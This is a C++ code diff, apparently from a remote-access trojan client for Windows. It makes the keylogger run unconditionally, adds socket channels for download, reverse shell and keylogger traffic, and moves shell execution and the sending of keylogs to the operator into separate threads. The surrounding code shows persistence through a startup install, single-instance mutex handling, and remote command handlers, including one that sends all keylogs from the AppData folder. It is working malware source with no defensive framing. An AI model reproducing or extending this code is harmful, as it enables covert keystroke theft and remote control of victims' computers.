@@ -22,7 +22,7 @@
 std::map<std::string, std::shared_ptr<Stream>> connections;
 std::mutex connections_mutex;
 
-std::vector<std::string> socket_conf_list = {"MAIN", "FILE_MANAGER"};
+std::vector<std::string> socket_conf_list = {"MAIN", "FILE_MANAGER", "DOWNLOAD", "REVERSE_SHELL", "KEYLOGGER"};
 
 void add_connection(const std::string &key, Stream &stream) {
     std::lock_guard<std::mutex> lock(connections_mutex);
@@ -81,25 +81,28 @@ int main(int argc = 0, char *argv[] = nullptr) {
     Sleep(argc);
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
-#ifdef KEYLOGGER
+//#ifdef KEYLOGGER_DEF
         KeyLogger keyLogger(Stream(0));
         keyLogger.tryStart();
-#endif
+//#endif
         Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
         bool connectionState = true;
         while (connectionState) {
             std::cout << "trying to connect " << std::endl;
-
             generate_sockets();
             ThreadGen threadGen;
             Stream stream = *get_connection("FILE_MANAGER");
             FileManager fileManager(stream);
-            //stream = *get_connection("DOWNLOAD");
+            stream = *get_connection("DOWNLOAD");
             Download download(stream);
-            stream = *get_connection("MAIN");
+            stream = *get_connection("REVERSE_SHELL");
             ReverseShell reverseShell(stream);
+            stream =  *get_connection("KEYLOGGER");
+            keyLogger.setStream(stream);
+            stream = *get_connection("MAIN");
             SystemInformation sysInfo(stream);
             NetworkInformation networkInfo(stream);
+
 
             bool streamListening = true;
             /*
@@ -114,7 +117,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
                 KeyboardExecuter keyboardExecuter(stream);
                 Permission permission(stream);
                 MessageBoxGUI messageBoxGui(stream);
-#ifdef KEYLOGGER
+#ifdef KEYLOGGER_DEF
                 keyLogger.setStream(stream);
 #endif
              */
@@ -174,31 +177,19 @@ int main(int argc = 0, char *argv[] = nullptr) {
                         break;
                     }
                     case 11: { // executes command on shell
-                        reverseShell.send();
+                        threadGen.runInNewThread(&reverseShell, &ReverseShell::send);
                         break;
                     }
-#ifdef KEYLOGGER
-                    case 12: { // tries to downloadContent in new thread the keylogger if it's not running
-                        keyLogger.tryStart();
-                        break;
-                    }
-                    case 13: { // stops keylogger
-                        keyLogger.stopKeylogger();
-                        break;
-                    }
+//#ifdef KEYLOGGER_DEF
                     case 4: { // sends last log file in current session of client
-                        keyLogger.send();
+                        threadGen.runInNewThread(&keyLogger, &KeyLogger::send);
                         break;
                     }
                     case 14: { // sends all logs located on appdata folder
-                        keyLogger.sendAll();
+                        threadGen.runInNewThread(&keyLogger, &KeyLogger::sendAll);
                         break;
                     }
-                    case 15: { // sends if the keylogger is currently working
-                        keyLogger.sendState();
-                        break;
-                    }
-#endif
+//#endif
 #ifdef WEBCAM
                         case 16: { // send webcam devices
                             DeviceEnumerator deviceEnumerator(stream);
